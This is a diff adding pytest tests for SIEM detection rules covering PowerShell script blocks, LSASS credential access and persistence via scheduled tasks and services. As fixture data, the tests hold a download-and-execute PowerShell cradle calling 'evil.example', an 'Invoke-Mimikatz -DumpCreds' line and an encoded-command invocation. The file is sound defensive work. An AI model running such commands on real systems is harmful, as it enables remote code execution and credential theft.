@@ -3,9 +3,12 @@ import pytest
 from siem import storage
 from siem.rules.afterhours_logon import AfterHoursLogonRule
 from siem.rules.brute_force import BruteForceRule
+from siem.rules.credential_access import CredentialAccessRule
 from siem.rules.encoded_powershell import EncodedPowerShellRule
 from siem.rules.new_admin_account import NewAdminAccountRule
+from siem.rules.persistence import PersistenceRule
 from siem.rules.port_scan_detection import PortScanDetectionRule
+from siem.rules.powershell_scriptblock import PowerShellScriptBlockRule
 from siem.rules.suspicious_parent_child import SuspiciousParentChildRule
 from siem.rules.threat_intel_match import ThreatIntelMatchRule
 
@@ -291,4 +294,119 @@ class TestPortScanDetectionRule:
         rule.evaluate(conn, _wfp_block_event("2026-08-04T12:00:00.000Z", 1, "203.0.113.9", True, local_port="22"), row_id=1)
         rule.evaluate(conn, _wfp_block_event("2026-08-04T12:00:01.000Z", 2, "198.51.100.1", True, local_port="80"), row_id=2)
         # each remote IP only probed 1 port -- neither should fire yet
+        assert len(storage.get_recent_alerts(conn)) == 0
+
+
+class TestPowerShellScriptBlockRule:
+    def test_fires_on_download_cradle(self, conn):
+        rule = PowerShellScriptBlockRule()
+        raw_xml = event_data_xml(
+            ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')"
+        )
+        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        alerts = storage.get_recent_alerts(conn)
+        assert len(alerts) == 1
+        assert alerts[0]["mitre_id"] == "T1059.001"
+        assert "download cradle" in alerts[0]["description"]
+
+    def test_fires_on_named_offensive_tool(self, conn):
+        rule = PowerShellScriptBlockRule()
+        raw_xml = event_data_xml(ScriptBlockText="Invoke-Mimikatz -DumpCreds")
+        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 1
+
+    def test_fires_on_explicit_encoded_command(self, conn):
+        rule = PowerShellScriptBlockRule()
+        raw_xml = event_data_xml(ScriptBlockText="powershell -EncodedCommand SQBFAFgA")
+        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 1
+
+    def test_ignores_ordinary_script_blocks(self, conn):
+        rule = PowerShellScriptBlockRule()
+        raw_xml = event_data_xml(ScriptBlockText="Get-Process | Where-Object { $_.CPU -gt 10 }")
+        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 0
+
+    def test_ignores_download_without_execution(self, conn):
+        # A download alone (e.g. saving an installer to disk) isn't the
+        # cradle pattern -- only download + immediate execution should fire.
+        rule = PowerShellScriptBlockRule()
+        raw_xml = event_data_xml(
+            ScriptBlockText="Invoke-WebRequest -Uri http://example.com/file.zip -OutFile file.zip"
+        )
+        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 0
+
+    def test_ignores_unrelated_event_ids(self, conn):
+        rule = PowerShellScriptBlockRule()
+        raw_xml = event_data_xml(ScriptBlockText="Invoke-Mimikatz")
+        rule.evaluate(conn, make_event(4103, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 0
+
+
+class TestCredentialAccessRule:
+    def test_fires_on_lsass_access_with_vm_read(self, conn):
+        rule = CredentialAccessRule()
+        raw_xml = event_data_xml(
+            SourceImage=r"C:\Users\bob\AppData\Local\Temp\suspicious.exe",
+            TargetImage=r"C:\Windows\System32\lsass.exe",
+            GrantedAccess="0x1010",  # includes PROCESS_VM_READ (0x0010)
+        )
+        rule.evaluate(conn, make_event(10, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        alerts = storage.get_recent_alerts(conn)
+        assert len(alerts) == 1
+        assert alerts[0]["mitre_id"] == "T1003"
+        assert "suspicious.exe" in alerts[0]["description"]
+
+    def test_ignores_lsass_access_without_vm_read(self, conn):
+        rule = CredentialAccessRule()
+        raw_xml = event_data_xml(
+            SourceImage=r"C:\Windows\System32\svchost.exe",
+            TargetImage=r"C:\Windows\System32\lsass.exe",
+            GrantedAccess="0x1000",  # PROCESS_QUERY_LIMITED_INFORMATION only
+        )
+        rule.evaluate(conn, make_event(10, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 0
+
+    def test_ignores_process_access_to_other_targets(self, conn):
+        rule = CredentialAccessRule()
+        raw_xml = event_data_xml(
+            SourceImage=r"C:\Windows\System32\svchost.exe",
+            TargetImage=r"C:\Windows\explorer.exe",
+            GrantedAccess="0x1010",
+        )
+        rule.evaluate(conn, make_event(10, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 0
+
+    def test_ignores_unrelated_event_ids(self, conn):
+        rule = CredentialAccessRule()
+        raw_xml = event_data_xml(TargetImage=r"C:\Windows\System32\lsass.exe", GrantedAccess="0x1010")
+        rule.evaluate(conn, make_event(1, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        assert len(storage.get_recent_alerts(conn)) == 0
+
+
+class TestPersistenceRule:
+    def test_scheduled_task_creation_fires(self, conn):
+        rule = PersistenceRule()
+        raw_xml = event_data_xml(TaskName=r"\Microsoft\Windows\evil_task", SubjectUserName="bob")
+        rule.evaluate(conn, make_event(4698, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
+        alerts = storage.get_recent_alerts(conn)
+        assert len(alerts) == 1
+        assert alerts[0]["mitre_id"] == "T1053.005"
+        assert "evil_task" in alerts[0]["description"]
+
+    def test_new_service_installed_fires(self, conn):
+        rule = PersistenceRule()
+        raw_xml = event_data_xml(ServiceName="EvilSvc", ImagePath=r"C:\Temp\evil.exe")
+        event = make_event(7045, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml)
+        event["channel"] = "System"
+        rule.evaluate(conn, event, row_id=1)
+        alerts = storage.get_recent_alerts(conn)
+        assert len(alerts) == 1
+        assert alerts[0]["mitre_id"] == "T1543.003"
+        assert "EvilSvc" in alerts[0]["description"]
+
+    def test_ignores_unrelated_event_ids(self, conn):
+        rule = PersistenceRule()
+        rule.evaluate(conn, make_event(4624, "2026-08-04T12:00:00.000Z"), row_id=1)
         assert len(storage.get_recent_alerts(conn)) == 0
